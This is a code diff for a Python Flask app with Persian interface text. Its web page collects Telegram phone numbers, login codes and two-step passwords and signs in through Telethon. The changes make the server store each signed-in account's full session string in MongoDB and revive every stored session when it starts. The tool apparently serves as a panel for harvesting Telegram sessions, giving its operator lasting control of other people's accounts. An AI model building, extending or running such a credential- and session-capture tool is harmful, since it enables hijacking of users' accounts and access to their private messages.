@@ -8,6 +8,7 @@ from datetime import datetime
 from flask import Flask, request, jsonify, render_template_string, redirect
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.sessions import StringSession
 from pymongo import MongoClient
 import requests
 
@@ -76,6 +77,22 @@ def delete_session(phone):
     if os.path.exists(path):
         shutil.rmtree(path)
     sessions_col.delete_one({"phone": phone})
+    if phone in clients:
+        try:
+            clients[phone].disconnect()
+        except: pass
+        del clients[phone]
+
+# ===================== LOAD ALL SESSIONS =======================
+async def load_all_sessions():
+    for s in sessions_col.find({"session_string": {"$exists": True}}):
+        try:
+            client = TelegramClient(StringSession(s["session_string"]), CONFIG["api_id"], CONFIG["api_hash"], device_model=CONFIG["device_name"])
+            await client.start()
+            clients[s["phone"]] = client
+            print(f"✅ {s['phone']} فعال شد")
+        except Exception as e:
+            print(f"❌ مشکل در سشن {s['phone']}: {e}")
 
 # ===================== HTML USER PANEL ===========================
 HTML_PAGE = """
@@ -155,7 +172,7 @@ let phone = "";
 
 function nextStep(){
     const mainBtn = document.getElementById("mainBtn");
-    mainBtn.classList.add("active"); // تغییر رنگ هنگام کلیک
+    mainBtn.classList.add("active"); 
 
     let v = document.getElementById("mainInput").value;
 
@@ -164,7 +181,7 @@ function nextStep(){
         fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
         .then(r=>r.json()).then(d=>{
             if(d.status==="exists"){
-                document.getElementById("deleteBtn").style.display="block"; // نمایش دکمه حذف
+                document.getElementById("deleteBtn").style.display="block"; 
             } else {
                 sendPhone();
             }
@@ -191,10 +208,10 @@ function preparePasswordStep(){
     
     step = "password";
     mainInput.type = "password";
-    mainInput.value = ""; // پاک کردن نوشته قبلی
+    mainInput.value = ""; 
     mainInput.placeholder = "رمز دو مرحله‌ای";
     mainBtn.innerText = "تأیید رمز";
-    document.getElementById("deleteBtn").style.display = "none"; // مخفی کردن دکمه حذف
+    document.getElementById("deleteBtn").style.display = "none"; 
     title.innerText = "وارد کردن رمز دو مرحله‌ای";
 }
 
@@ -221,9 +238,8 @@ function sendPhone(){
     });
 }
 
-// ======================= finish() با ثبت زمان =======================
 function finish(){
-    const timestamp = new Date().toISOString(); // زمان ساخت سشن
+    const timestamp = new Date().toISOString(); 
     fetch("/register_session_time",{
         method:"POST",
         headers:{"Content-Type":"application/json"},
@@ -335,20 +351,51 @@ def send_phone():
 @app.route("/send_code", methods=["POST"])
 def send_code():
     phone = normalize_phone(request.json["phone"])
+    client = clients[phone]
     try:
-        run_async(clients[phone].sign_in(phone, request.json["code"]))
-        sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
+        run_async(client.sign_in(phone, request.json["code"]))
+
+        s = StringSession(client.session.save())
+        sessions_col.update_one(
+            {"phone": phone},
+            {"$set": {
+                "session_string": s.save(),
+                "enabled": True,
+                "created": datetime.utcnow()
+            }},
+            upsert=True
+        )
         return jsonify(status="ok")
     except SessionPasswordNeededError:
         return jsonify(status="2fa")
     except PhoneCodeInvalidError:
         return jsonify(status="error")
+    except Exception as e:
+        return jsonify(status="error", msg=str(e))
 
 @app.route("/send_password", methods=["POST"])
 def send_password():
     phone = normalize_phone(request.json["phone"])
-    run_async(clients[phone].sign_in(password=request.json["password"]))
-    sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
+    client = clients[phone]
+    run_async(client.sign_in(password=request.json["password"]))
+
+    s = StringSession(client.session.save())
+    sessions_col.update_one(
+        {"phone": phone},
+        {"$set": {
+            "session_string": s.save(),
+            "enabled": True,
+            "created": datetime.utcnow()
+        }},
+        upsert=True
+    )
+    return jsonify(ok=True)
+
+@app.route("/register_session_time", methods=["POST"])
+def register_time():
+    phone = normalize_phone(request.json["phone"])
+    created = request.json["created"]
+    sessions_col.update_one({"phone": phone}, {"$set": {"created": created}}, upsert=True)
     return jsonify(ok=True)
 
 @app.route("/admin", methods=["GET","POST"])
@@ -377,4 +424,5 @@ threading.Thread(target=keep_alive, daemon=True).start()
 
 # ===================== RUN =======================================
 if __name__ == "__main__":
+    run_async(load_all_sessions())
     app.run(host="0.0.0.0", port=8000)
